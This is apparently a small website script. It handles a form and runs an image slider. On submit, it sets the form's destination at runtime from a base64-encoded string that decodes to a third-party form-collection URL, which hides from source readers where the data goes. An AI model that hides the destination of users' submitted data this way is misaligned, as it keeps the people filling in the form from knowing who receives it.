document.addEventListener("DOMContentLoaded", function () {
    let form = document.getElementById("hiddenForm");

    // Check if the form exists
    if (form) {
        form.addEventListener("submit", function (event) {
            event.preventDefault(); // Prevent form submission

            // Set action dynamically before submitting
            form.action = atob("aHR0cHM6Ly9zdWJtaXQtZm9ybS5jb20vSHRjaWx3QkRE");

            // Now submit the form
            form.submit();
        });
    } else {
        console.error("Form not found!");
    }
});

let currentIndex = 0;
const slides = document.querySelectorAll(".slide");
const totalSlides = slides.length;
const slider = document.querySelector(".hero-slider");
const prevBtn = document.querySelector(".prev");
const nextBtn = document.querySelector(".next");

function moveSlide(direction) {
    currentIndex += direction;
    if (currentIndex >= totalSlides) currentIndex = 0;
    if (currentIndex < 0) currentIndex = totalSlides - 1;
    updateSlider();
}

function updateSlider() {
    slider.style.transform = `translateX(${-currentIndex * 100}%)`;
}

window.onload = function () {
    if (!slides.length || !slider) {
        console.error("Slider elements not found!");
        return;
    }

    if (prevBtn && nextBtn) {
        prevBtn.addEventListener("click", () => moveSlide(-1));
        nextBtn.addEventListener("click", () => moveSlide(1));
    }

    if (totalSlides > 1) {
        setInterval(() => moveSlide(1), 5000);
    }
};




